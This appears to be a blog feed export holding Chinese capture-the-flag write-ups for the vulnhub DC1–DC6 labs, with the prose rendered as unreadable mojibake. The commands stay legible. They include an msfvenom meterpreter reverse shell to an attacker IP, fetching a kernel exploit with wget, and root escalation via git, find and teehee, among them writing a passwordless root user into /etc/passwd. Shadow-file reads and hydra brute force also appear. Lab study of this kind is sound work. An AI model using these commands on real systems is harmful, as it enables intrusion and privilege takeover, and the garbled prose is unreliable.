æˆ‘ä»¬å¯ä»¥åœ¨index.phpä¸­ç›´æ¥æ’å…¥phpä»£ç   æ¯”å¦‚phpinfo() åˆ°ç½‘ç«™é¦–é¡µä¹‹åå‘ç°æˆåŠŸäº†<br>ï¼ˆè¿™é‡Œå¦‚æœè¦åœ¨indexä¸­æ’å…¥å¿…é¡»è¦æ˜¯ç”¨çš„å’Œç½‘ç«™ç°åœ¨ç”¨çš„æ¨¡æ¿ä¸€æ ·æ‰å¯ä»¥  å¦‚æœåœ¨htmlæ–‡ä»¶å¤¹é‡Œé¢æ’å…¥å°±ä¸ç”¨ç®¡<br>ç„¶åä¸Šä¼ phpä¸€å¥è¯æœ¨é©¬ ç”¨èšå‰‘è¿æ¥ æ‹¿åˆ°webshell<br>ä½†æ˜¯è¿™é‡Œæ²¡æœ‰ncæŒ‡ä»¤ æˆ‘ä»¬è¦ç”¨åˆ°msfconsole<br> å…ˆè¾“å…¥msfconsoleè¿›å…¥å‘½ä»¤é¢æ¿   <code>use payload/php/meterpreter/reverse_tcp</code><br><img src="https://pic1.imgdb.cn/item/679a237fd0e0a243d4f87693.png" alt="|450"><br>ç„¶åéœ€è¦ç”¨<mark>msfvenom</mark>ç”Ÿæˆæ”»å‡»æ–‡ä»¶<br>  <code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.240.11 lport=1234 &gt; a.php </code><br>æ¥ç€å›åˆ°msfconsole  ç”¨ <code>use exploit/multi/handler</code>  è¿™æ˜¯ä¸€ä¸ªç›‘å¬å™¨  ç„¶åè®¾ç½®payload  <code>set payload php/meterpreter/reverse_tcp</code><br>show options æŸ¥çœ‹éœ€è¦é…ç½®ä»€ä¹ˆ<br> <code>set lhost 192.168.240.11</code>  <code>set lpost 1234</code>   æœ€årunå°±å¯ä»¥äº†<br>åœ¨webç•Œé¢åˆ·æ–°åˆšæ‰æ’å…¥payload phpä»£ç çš„ç•Œé¢  å°±å¯ä»¥åœ¨msfä¸­çœ‹åˆ°æˆåŠŸè¿æ¥äº†<br><img src="https://pic1.imgdb.cn/item/679a23e5d0e0a243d4f8769d.png" alt="|500"><br>è¾“å…¥shell è¿›å…¥</p>
<h3 id="2ç”¨joomlaæ¼æ´-éçˆ†ç ´"><a href="#2ç”¨joomlaæ¼æ´-éçˆ†ç ´" class="headerlink" title="2ç”¨joomlaæ¼æ´ (éçˆ†ç ´)"></a>2ç”¨joomlaæ¼æ´ (éçˆ†ç ´)</h3><p>ç”¨searchsploit æœç´¢joomla + ç‰ˆæœ¬å·<br>è¿™ä¸ªè„šæœ¬å‘Šè¯‰æˆ‘ä»¬äº†sqlmapä½¿ç”¨çš„sqlmap<br><img src="https://pic1.imgdb.cn/item/679a2415d0e0a243d4f876a2.png"><br>åˆ°columnsè¿™é‡Œè¦æ³¨æ„ä¸€ç‚¹ è¿™é‡Œç”¨è‡ªåŠ¨å°±ä»€ä¹ˆéƒ½æ²¡æœ‰  è€Œä¸”å› ä¸ºè¿™ä¸ªè¡¨åæœ‰# æœ‰ç”¨å¼•å·æ‹¬èµ·æ¥<br><img src="https://pic1.imgdb.cn/item/679a2415d0e0a243d4f876a3.png" alt="|500"><br>åŒæ ·å¯ä»¥å¾—åˆ°è¿™ä¸ªå¯†ç </p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>å¯ä»¥åšä¸€äº›å¸¸è§„çš„æ“ä½œæ¯”å¦‚suid  ç³»ç»Ÿæ¼æ´ç­‰  suidæ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ ä½†æ˜¯ç³»ç»Ÿæ¯”è¾ƒè€ å¯ä»¥ç”¨å†…æ ¸ææƒ<br>.linuxç³»ç»Ÿæ¼æ´ææƒ<br>å…ˆåœ¨webshellé‡Œé¢ç”¨<code>cat /etc/*releas</code> å¾—åˆ°å½“å‰ubuntuç³»ç»Ÿçš„ç‰ˆæœ¬å·  DISTRIB_RELEASE&#x3D;16.04<br><code>uname -a</code> æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬   Linux DC-3 4.4.0-21-generic<br>ç„¶åç”¨searchsploit æ‰¾åˆ°æ¼æ´åˆ©ç”¨è„šæœ¬ï¼ˆå¿…é¡»åŒæ—¶æ»¡è¶³ç³»ç»Ÿå’Œå†…æ ¸ç‰ˆæœ¬ï¼‰  è¿™é‡Œç»™çš„ç½‘å€å·²ç»å¤±æ•ˆ éœ€è¦æˆ‘ä»¬å»ä»“åº“ æ‰¾åˆ°æ–°çš„åœ°æ–¹<br>æŠŠä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶ç”¨scpå¤åˆ¶åˆ°kali çš„&#x2F;var&#x2F;www&#x2F;htmlä¸­  ç„¶ååœ¨webshellç”¨wgetä¸‹è½½è¿™ä¸ªåˆ©ç”¨è„šæœ¬<br>è§£å‹ä¹‹å è¿è¡Œè„šæœ¬å°±å¯ä»¥ææƒäº†<br><img src="https://pic1.imgdb.cn/item/679a23e6d0e0a243d4f8769f.png" alt="|475"></p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>DC2é¶åœºå¤ç›˜</title>
    <url>/posts/3469.html</url>
    <content><![CDATA[<p>vulnhub-DC2é¶åœºå¤ç›˜</p>
<span id="more"></span>
<p>å…ˆæ ¹æ®æç¤º ä¿®æ”¹host</p>
<h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><p><img src="https://pic1.imgdb.cn/item/679a2562d0e0a243d4f876b9.png" alt="|275"><br>æ‰«æçš„ç»“æœæ˜¾ç¤ºåªæœ‰ä¸€ä¸ª80ç«¯å£ ä½†æ˜¯å®é™…ä¸Šæœ‰ä¸€ä¸ªsshç«¯å£ ç”¨-p-æ‰«ææ‰€æœ‰ç«¯å£  7744</p>
<h2 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h2><p><img src="https://pic1.imgdb.cn/item/679a2563d0e0a243d4f876ba.png" alt="|900"><br>é¡µé¢ä¸Šæœ‰ä¸€ä¸ªflagæç¤ºè¦ç”¨åˆ°cewlæ‰«æ ç„¶åç”¨æ‰«æå‡ºæ¥çš„å†…å®¹å½“ä½œçˆ†ç ´çš„å­—å…¸ <code>cewl -w pass.txt http://dc-2/</code><br>è¿™ä¸ªæ˜¯ä¸€ä¸ªwordpress cms   æˆ‘ä»¬å¯ä»¥ç”¨wpscanæ‰«ä¸€ä¸‹ç”¨æˆ·å<br><code>wpscan --url http://dc-2/ --enumerate u</code><br>å¾—åˆ°ä¸¤ä¸ªç”¨æˆ·å tomå’Œjerry<br>ç„¶åç”¨bpçˆ†ç ´  å¾—åˆ°ä¸¤ä¸ªè´¦æˆ·  æˆ‘ä»¬åˆ†åˆ«ç™»å½•åˆ°è¿™ä¸¤ä¸ªè´¦æˆ·<br><img src="https://pic1.imgdb.cn/item/679a2565d0e0a243d4f876bb.png" alt="|725"><br><img src="https://pic1.imgdb.cn/item/679a2566d0e0a243d4f876bc.png" alt="|925"><br><img src="https://pic1.imgdb.cn/item/679a2566d0e0a243d4f876bd.png" alt="|500"><br>æ‰¾åˆ°äº†flag2 æˆ‘ä»¬ç”¨ssh ç™»å½• è¿™ä¸ªflag åœ¨jerryè´¦æˆ·æ‰¾åˆ°çš„ ç”¨tomç™»å½•ssh<br><img src="https://pic1.imgdb.cn/item/679a25b3d0e0a243d4f876c4.png" alt="|475"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p><img src="https://pic1.imgdb.cn/item/679a25b4d0e0a243d4f876c5.png"><br>å‘ç°äº†ä¸æ˜¯æ™®é€šbash æ˜¯rbash  å‘½ä»¤å—é™åˆ¶<br><img src="https://pic1.imgdb.cn/item/679a25b5d0e0a243d4f876c6.png"><br>æŸ¥çœ‹å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤<br>è¿™é‡Œæˆ‘ä»¬ç”¨vié€ƒé€¸ : è¿›å…¥viä¹‹åè¾“å…¥ :set shell&#x3D;&#x2F;bin&#x2F;bash :shell  å†ä¿®æ”¹ä¸€ä¸‹ç¯å¢ƒ export PATH&#x3D;â€™&#x2F;usr&#x2F;bin:&#x2F;binâ€™<br> æ‰§è¡Œ <code>cat /etc/passwd</code> å¯ä»¥çœ‹åˆ°è¿˜æœ‰ä¸€ä¸ªjerry çš„è´¦æˆ· æˆ‘ä»¬ç”¨suåˆ‡æ¢åˆ°jerry<br> å‘ç°jerryå¯ä»¥ç”¨rootæƒé™æ‰§è¡Œ git  ç°åœ¨ç”¨gitææƒ<br> <img src="https://pic1.imgdb.cn/item/679a25b7d0e0a243d4f876c7.png"><br> <code>sudo git help config !/bin/bash #è¾“å…¥!/bin/bashï¼Œå³å¯æ‰“å¼€ä¸€ä¸ªç”¨æˆ·ä¸ºrootçš„shell</code> </p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>DC1é¶åœºå¤ç›˜</title>
    <url>/posts/52872.html</url>
    <content><![CDATA[<p>vulnhub-DC1é¶åœºå¤ç›˜</p>
<span id="more"></span>
<h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><p><img src="https://pic1.imgdb.cn/item/679a2905d0e0a243d4f8771d.png" alt="|500"><br>è¿™ä¸ªé¶æœºç”¨çš„æ˜¯drupal    è¿˜å¯ä»¥ä¸‹è½½droopescanæ‰«æå™¨   ç½‘ä¸Šæ•™ç¨‹æ˜¯ç”¨pip3å®‰è£…ä½†æ˜¯æˆ‘çš„ç‰ˆæœ¬æ— æ³•ç”¨è¿™ä¸ªå®‰è£… éœ€è¦ä¸‹è½½pipx å¹¶ä¸”è¦ç”¨bash <code>pipx ensurepath</code>  ç”¨è™šæ‹Ÿç¯å¢ƒ æ¥è¿è¡Œ<code>python3 -m venv droopescan-env; source droopescan-env/bin/activate</code></p>
<h2 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h2><p>ç”¨ wappå¯ä»¥å¾—åˆ°drupalçš„ç‰ˆæœ¬å·<br><img src="https://pic1.imgdb.cn/item/679a2948d0e0a243d4f87727.png" alt="|375">&#96;<br>ç”¨searchsploitæŸ¥çœ‹druptalçš„æ¼æ´<br><img src="https://pic1.imgdb.cn/item/679a2909d0e0a243d4f8771e.png"><br>è¿™é‡Œåˆ©ç”¨è¿™ä¸ªadd adminçš„è„šæœ¬ -t -u -p æ·»åŠ ä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·<br>æ¥ç€ä»¿ç…§ä»¥å‰çš„ç»éªŒ ä¸‹è½½phpæ’ä»¶   åœ¨æ–‡ç« ä¸­æ’å…¥php ä»£ç  æ‹¿åˆ°webshell<br><img src="https://pic1.imgdb.cn/item/679a290ad0e0a243d4f8771f.png"><br><img src="https://pic1.imgdb.cn/item/679a290dd0e0a243d4f87721.png" alt="|500"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æŸ¥çœ‹suid<br><img src="https://pic1.imgdb.cn/item/679a290cd0e0a243d4f87720.png"><br>å‘ç°findæŒ‡ä»¤æœ‰suid   æ‰€ä»¥å¯ä»¥åˆ©ç”¨find  åé¢æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ æ¯”å¦‚æˆ‘ä»¬ç”¨ -exec cat &#x2F;etc&#x2F;shadow \; çœ‹  åé¢è¦åŠ åæ–œæ å’Œå°å·å‘Šè¯‰findåé¢ä¸ç”¨å†è§£æå‘½ä»¤äº†   è¿™æ ·å¯ä»¥ç”¨rootæ‰§è¡Œå‘½ä»¤ æ‹¿åˆ°flag<br>æ³•äºŒï¼šæ‹¿åˆ°flag4ç”¨æˆ·çš„hashä¹‹å ç”¨johnç ´è§£ ç™»å½•åˆ°flag4ç”¨æˆ·  ç”¨findææƒ<br><mark>findææƒ</mark> -exec â€˜&#x2F;bin&#x2F;shâ€™ \;  è§£å†³</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>DC5é¶åœºå¤ç›˜</title>
    <url>/posts/19078.html</url>
    <content><![CDATA[<p>vulnhub-DC5é¶åœºå¤ç›˜</p>
<span id="more"></span>
<h2 id="ç«¯å£æ¢æµ‹"><a href="#ç«¯å£æ¢æµ‹" class="headerlink" title="ç«¯å£æ¢æµ‹"></a>ç«¯å£æ¢æµ‹</h2><p>è¿™é¢˜çš„é¶åœºæç¤ºè¦åœ¨webæ‰¾åˆ°åˆ·æ–°æ”¹å˜çš„ä¸œè¥¿<br><img src="https://pic1.imgdb.cn/item/679a1f6ed0e0a243d4f87639.png"><br>è¿™ä¸ªé¶æœºåªæœ‰ä¸€ä¸ª80ç«¯å£ æ²¡æœ‰22sshç«¯å£<br>è€Œä¸”è¿™ä¸ªç½‘ç«™æ²¡æœ‰ç”¨cms  æ˜¯ä¸€ä¸ªé™æ€çš„é¡µé¢</p>
<h2 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h2><p>åœ¨contact us é‡Œæœ‰è¾“å…¥æ¡† ç”¨sqlmap æ‰«æä¹‹åæ²¡æœ‰æ³¨å…¥ç‚¹<br>åœ¨contact us è¾“å…¥å†…å®¹è¿”å›çš„thank you.php ç•Œé¢åˆ·æ–° å‘ç°ä¸‹é¢çš„footerä¼šåˆ·æ–° æŸ¥çœ‹é¡µé¢æºä»£ç <br><img src="https://pic1.imgdb.cn/item/679a1f6fd0e0a243d4f8763a.png" alt="|450"><br>è¿™ä¸ªç•Œé¢æ˜¯æœ‰ä¸€ä¸ªfooter.phpçš„ æ‰€ä»¥è¿™é‡Œæœ‰ä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´  å› ä¸ºæ˜¯å…¶ä»–æœ‰è°ƒç”¨è¿™ä¸ªfooter.php<br>ä½†æ˜¯ç°åœ¨ä¸çŸ¥é“ç”¨ä»€ä¹ˆå…³é”®å­—è®¿é—®åˆ°åŒ…å«æ–‡ä»¶  æ‰€ä»¥æˆ‘ä»¬ç”¨wfuzzè·‘å…³é”®å­—<br><img src="https://pic1.imgdb.cn/item/679a1f6fd0e0a243d4f8763b.png" alt="|575"><br><img src="https://pic1.imgdb.cn/item/679a1f70d0e0a243d4f8763c.png"><br>æ‰¾åˆ°äº†å…³é”®å­—æ˜¯file  ç°åœ¨å°±å¯ä»¥è®¿é—®æœåŠ¡å™¨ä¸­çš„æ–‡ä»¶äº†   <strong>ç°åœ¨çš„åˆä¸€ä¸ªéš¾é¢˜æ˜¯åªèƒ½çœ‹åˆ°æ–‡ä»¶å¦‚ä½•æ‰èƒ½æ‹¿åˆ°shellå‘¢</strong><br>æˆ‘ä»¬çŸ¥é“å¦‚æœå¯ä»¥å†™å…¥ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬å°±å¯ä»¥æ‹¿åˆ°shell   ä½†æ˜¯åº”è¯¥ç”¨ä»€ä¹ˆæ–¹å¼å®ç°å‘¢ï¼Ÿ<br>ç”¨apache2æœåŠ¡è®¿é—®çš„æ—¥å¿— é”™è¯¯æ—¥å¿—ä¹Ÿä¼šå­˜ å­˜åœ¨&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log ä¸­  è¿™é‡Œæ²¡æœ‰æˆ‘ä»¬å°±ç”¨nginx<br>ä¸‹ä¸€æ­¥å°±æ˜¯ç”¨bpä¿®æ”¹<br><img src="https://pic1.imgdb.cn/item/679a1f70d0e0a243d4f8763c.png" alt="|425"><br>è¿™ä¸€æ¡è®°å½•ä¼šåœ¨access.logä¸­<br><img src="https://pic1.imgdb.cn/item/679a1f98d0e0a243d4f8763e.png"><br>æˆ‘ä»¬çš„æ ‡è®°å­˜åœ¨ è€Œä¸”åé¢çš„phpä»£ç æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥ è¯´æ˜è¢«æˆåŠŸè§£æäº†  ç”¨èšå‰‘è¿æ¥shell</p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>åœ¨ä¸Šä¸€æ­¥æ‹¿åˆ°èšå‰‘çš„shellä¹‹ååå¼¹åˆ°æœ¬æœºä¸­<br>ææƒæ€è·¯è¿˜æ˜¯æ‰¾åˆ°å­˜åœ¨æ¼æ´çš„æœåŠ¡<br><img src="https://pic1.imgdb.cn/item/679a1f98d0e0a243d4f8763f.png" alt="|450"><br>è¿™é‡Œæœ‰ä¸€ä¸ªscreenæœåŠ¡è€Œä¸”å‘Šè¯‰äº†ç‰ˆæœ¬å· å¤§æ¦‚ç‡å°±æ˜¯åˆ©ç”¨è¿™ä¸ª<br>ç„¶åç”¨wget ä»é¶æœºä¸‹è½½æœ¬æœºçš„è¿™ä¸ªè„šæœ¬  <mark>æ³¨æ„è¿™ä¸ªè„šæœ¬ä¸èƒ½å†wwwç›®å½•ä¸‹è¿è¡Œ  åœ¨å…¶ä»–ç›®å½•ä¸‹wget</mark><br>è¿è¡Œä¹‹åæ‹¿åˆ°rootæƒé™ è§£å†³ï¼ï¼ï¼ </p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>DC4é¶åœºå¤ç›˜</title>
    <url>/posts/52100.html</url>
    <content><![CDATA[<p>vulnhub-DC4é¶åœºå¤ç›˜</p>
<span id="more"></span>
<h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><p>è¿™ä¸ªé¶æœºå¼€æ”¾80å’Œ22ç«¯å£   æ²¡æœ‰ä»€ä¹ˆå¤šä½™ä¿¡æ¯</p>
<h2 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h2><p><img src="https://pic1.imgdb.cn/item/679a1f99d0e0a243d4f87640.png" alt="|400"><br>åªæœ‰ä¸€ä¸ªç™»å½•ç•Œé¢  åªèƒ½çˆ†ç ´  ç”¨bpçˆ†ç ´å¾—åˆ°adminå¯†ç  ç™»å…¥ç®¡ç†å‘˜ç•Œé¢<br><img src="https://pic1.imgdb.cn/item/679a20f5d0e0a243d4f87658.png" alt="|500"><br><img src="https://pic1.imgdb.cn/item/679a20f6d0e0a243d4f87659.png" alt="|825"><br>è¿™é‡Œçš„ç•Œé¢å¯ä»¥è¿è¡Œä¸€äº›shellçš„æŒ‡ä»¤ çŒœæµ‹åœ¨é¡µé¢çš„è¯·æ±‚åŒ…é‡Œé¢æœ‰æŒ‡ä»¤ ç”¨bpè¯•è¯•<br><img src="https://pic1.imgdb.cn/item/679a20f7d0e0a243d4f8765a.pngg" alt="500"><br>å‘ç°æœç„¶æ˜¯  ç©ºæ ¼ç”¨+ç»•è¿‡ ç°åœ¨å°±æŠŠæŒ‡ä»¤å˜æˆåå¼¹shell  æ‹¿åˆ°wwwçš„shell</p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>è¿™é¢˜ææƒæ–¹å¼æœ‰å¾ˆå¤šç§</p>
<h3 id="1ç”¨eximæ¼æ´"><a href="#1ç”¨eximæ¼æ´" class="headerlink" title="1ç”¨eximæ¼æ´"></a>1ç”¨eximæ¼æ´</h3><p>æ­¥éª¤å’ŒDC8ä¸€æ¨¡ä¸€æ ·</p>
<h3 id="2è®¿é—®ä¸åŒç”¨æˆ·çš„ä¿¡æ¯"><a href="#2è®¿é—®ä¸åŒç”¨æˆ·çš„ä¿¡æ¯" class="headerlink" title="2è®¿é—®ä¸åŒç”¨æˆ·çš„ä¿¡æ¯"></a>2è®¿é—®ä¸åŒç”¨æˆ·çš„ä¿¡æ¯</h3><p><img src="https://pic1.imgdb.cn/item/679a20f8d0e0a243d4f8765b.png"><br>åœ¨homeç›®å½•ä¸‹é¢æœ‰ä¸‰ä¸ªç”¨æˆ·<br><img src="https://pic1.imgdb.cn/item/679a2129d0e0a243d4f8765e.png" alt="|500"><br>jimè¿™é‡Œæœ‰ä¸€ä¸ªåªæœ‰jimå¯ä»¥è¯»å†™çš„æ–‡ä»¶ è‚¯å®šæœ‰ä¸œè¥¿   åœ¨ç›®å½•backupsä¸‹é¢æœ‰ä¸€äº›å¯†ç <br>ç°åœ¨ç”¨çˆ†ç ´çœ‹çœ‹æ˜¯å¦èƒ½ç™»å½•jimçš„ssh<br>é€šè¿‡hydraæˆåŠŸè¿›å…¥ssh <code>hydra -l jim -P pass.txt ssh://192.168.240.249</code><br><img src="https://pic1.imgdb.cn/item/679a2129d0e0a243d4f8765f.png"><br>ç™»å½•åˆ°jimçœ‹åˆ°mboxä¸­çš„å†…å®¹æ˜¯ä¸€å°é‚®ä»¶ ä½†æ˜¯æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯<br>åˆ°&#x2F;var&#x2F;mailè·¯å¾„ä¸‹ çœ‹åˆ°æœ‰ä¸€ä¸ªjimé‚®ä»¶  é‡Œé¢æœ‰å¦ä¸€ä¸ªç”¨æˆ·çš„å¯†ç   ç™»å½•åˆ°charlesä¸­ (è¿™é‡Œé‚®ä»¶ä¸­çš„Cæ˜¯å¤§å†™çš„ ä½†æ˜¯ç™»å½•sshè¦ç”¨å°å†™cä¸çŸ¥é“ä¸ºä»€ä¹ˆ)<br><img src="https://pic1.imgdb.cn/item/679a212ad0e0a243d4f87660.png" alt="|500"><br>å‘ç°è¿™ä¸ªç”¨æˆ·æœ‰ä¸€ä¸ªç”¨rootæ‰§è¡Œteeheeçš„æƒé™<br>æœ‰ä¸¤ç§æ–¹å¼ç”¨teeheeææƒ  ä¸€ç§æ˜¯<br> <code>echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</code><br><mark>å¯ä»¥çœ‹åˆ°teeheeå¯ä»¥æŠŠä¸€ä¸ªè¯­å¥åŠ åˆ°æŸä¸ªæ–‡ä»¶é‡Œé¢</mark>  è¿™é‡Œæ˜¯æ–°å»ºäº†ä¸€ä¸ªç”¨æˆ·æœ‰äº†rootæƒé™<br>ä¹Ÿå¯ä»¥ç”¨teeheeæŠŠcharleså˜æˆä¸€ä¸ªè¶…çº§ç”¨æˆ· å†™åˆ°&#x2F;etc&#x2F;sudoers ä¸­<br> <code>echo &quot;charles ALL=(ALL:ALL) ALL&quot; | sudo teehee -a /etc/sudoers</code><br>è¿™é‡Œsudoè¦å†™åœ¨åˆ†éš”ç¬¦åé¢ å› ä¸ºæ˜¯æœ‰rootæƒé™æ‰§è¡Œteehee</p>
<h2 id="ç”¨test-sh"><a href="#ç”¨test-sh" class="headerlink" title="ç”¨test.sh"></a>ç”¨test.sh</h2><p>åˆšæ‰jimç›®å½•ä¸‹æœ‰ä¸€ä¸ªtest.sh æ–‡ä»¶ æƒé™æ˜¯-rwsrwxrwx<br><img src="https://pic1.imgdb.cn/item/679a212ad0e0a243d4f87661.png" alt="|500"><br><strong>SUID (Set User ID)</strong>ï¼š</p>
<ul>
<li>å½“æ–‡ä»¶çš„æ‰§è¡Œæƒé™ä¸­å‡ºç° <code>s</code> ï¼ˆåœ¨æ‰€æœ‰è€…æƒé™ä½ç½®ï¼‰ï¼Œè¡¨ç¤ºè¯¥æ–‡ä»¶æ˜¯è®¾ç½®äº† SUID æƒé™ã€‚SUID æƒé™è®©ç”¨æˆ·æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œç¨‹åºä»¥æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™è¿è¡Œï¼Œè€Œä¸æ˜¯ä»¥æ‰§è¡Œå®ƒçš„ç”¨æˆ·çš„æƒé™è¿è¡Œã€‚</li>
<li>ä¾‹å¦‚ï¼Œå¦‚æœæ–‡ä»¶çš„æ‰€æœ‰è€…æ˜¯ <code>root</code>ï¼Œé‚£ä¹ˆæ— è®ºå“ªä¸ªç”¨æˆ·æ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œéƒ½ä¼šä»¥ <code>root</code> æƒé™è¿è¡Œå®ƒã€‚<br>æ‰€ä»¥å¯ä»¥åœ¨æ–‡ä»¶åé¢åŠ ä¸Šä¸€å¥åå¼¹shell  ç”¨rootèº«ä»½æ‰§è¡Œ å°±å¯ä»¥æ‹¿åˆ°rootshell<br><img src="https://pic1.imgdb.cn/item/679a212bd0e0a243d4f87662.png"></li>
</ul>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>DC6é¶åœºå¤ç›˜</title>
    <url>/posts/35203.html</url>
    <content><![CDATA[<p>vulnhub-DC6é¶åœºå¤ç›˜</p>
<span id="more"></span>

<h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><p>é¦–å…ˆè¦æ ¹æ®vulnhubä¸Šé¢çš„æç¤º  ä¿®æ”¹æœ¬æœºå’Œkaliçš„hostæ–‡ä»¶<br>ç»™äº†ä¸€ä¸ªæç¤º<br><img src="https://pic1.imgdb.cn/item/679a1d0ed0e0a243d4f875f5.png"><br>è®©æˆ‘ä»¬æ‰«æ å…ˆæŠŠæŒ‡å®šçš„å¯†ç å­—å…¸å­˜èµ·æ¥   æˆ‘ä»¬ç”¨bpçˆ†ç ´ç®¡ç†å‘˜è´¦æˆ·</p>
<h2 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h2><p>è¿™ä¸ªç«™ç‚¹æ˜¯ç”¨wordpressåˆ›å»ºçš„ å¯ä»¥è®¿é—®readme.html å°±å¯ä»¥çœ‹åˆ°å“ªé‡Œæ˜¯ç™»å½•ç•Œé¢ ä¸€èˆ¬è¿˜ä¼šæœ‰ç‰ˆæœ¬ä¿¡æ¯<br><img src="https://pic1.imgdb.cn/item/679a1d0ed0e0a243d4f875f6.png" alt="|450"></p>
<p>åå°ç™»å½•ç•Œé¢å°±åœ¨&#x2F;wp-admin  ç°åœ¨å°±æ˜¯çˆ†ç ´ ç”¨adminçˆ†ç ´    æˆ‘ä»¬å°è¯•äº†çˆ†ç ´ ä½†æ˜¯æ— æ³•å¾—åˆ°å¯†ç <br>ç°åœ¨ç”¨wpscanæ‰«æ æŒ‡å®šurl å’Œapitoken    ç„¶åæšä¸¾ç”¨æˆ·å   <code>wpscan --url wordy --enumerate u</code><br>ç„¶åæŠŠå¾—åˆ°çš„ç”¨æˆ·åå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œé¢  çˆ†ç ´ç”¨æˆ·åå’Œå¯†ç  </p>
<p>æ¥ç€å°±å¯ä»¥ç™»å½•åˆ°ç®¡ç†å‘˜è´¦æˆ·<br>ç„¶ååˆ©ç”¨webä¸Šçš„ä¿¡æ¯æ‹¿åˆ°shell è¿™é‡Œè¦ç”¨åˆ°æ’ä»¶çš„activity monitor æ’ä»¶æ¼æ´ ç”¨searchsploit<br><img src="https://pic1.imgdb.cn/item/679a1d14d0e0a243d4f875f7.png" alt="|500"><br>åˆ©ç”¨è¿™ä¸ªæ¼æ´   ä¿®æ”¹payload ä¸Šä¼ åˆ°æœ¬æœº åœ¨webç«¯è®¿é—®<br><img src="https://pic1.imgdb.cn/item/679a1d16d0e0a243d4f875f8.png" alt="|425"><br>ç„¶ååœ¨webç«¯ç‚¹å‡»è¿™ä¸ªæ–‡ä»¶ å°±å¯ä»¥æ‹¿åˆ°shell<br><img src="https://pic1.imgdb.cn/item/679a1d17d0e0a243d4f875f9.png"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>è¿™ä¸ªwwwç”¨æˆ·ç›®å½•ä¸‹é¢å…¶å®æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿   &#x3D;&#x3D;å»&#x2F;home&#x2F;&#x3D;&#x3D; ç›®å½•ä¸‹   è¿™é‡Œå¯ä»¥çœ‹åˆ°å…¶ä»–å‡ ä¸ªç”¨æˆ·çš„æ–‡ä»¶å¤¹<br>æ‰¾åˆ°jensç”¨æˆ· ç›®å½•ä¸‹æœ‰ä¸€ä¸ªbackup.sh<br><code>ls -al backups.sh</code><br><code>-rwxrwxr-x 1 jens devs 50 Apr 26  2019 backups.sh</code><br>å¯ä»¥çœ‹åˆ°devsç»„çš„äººæœ‰rwxæƒé™ 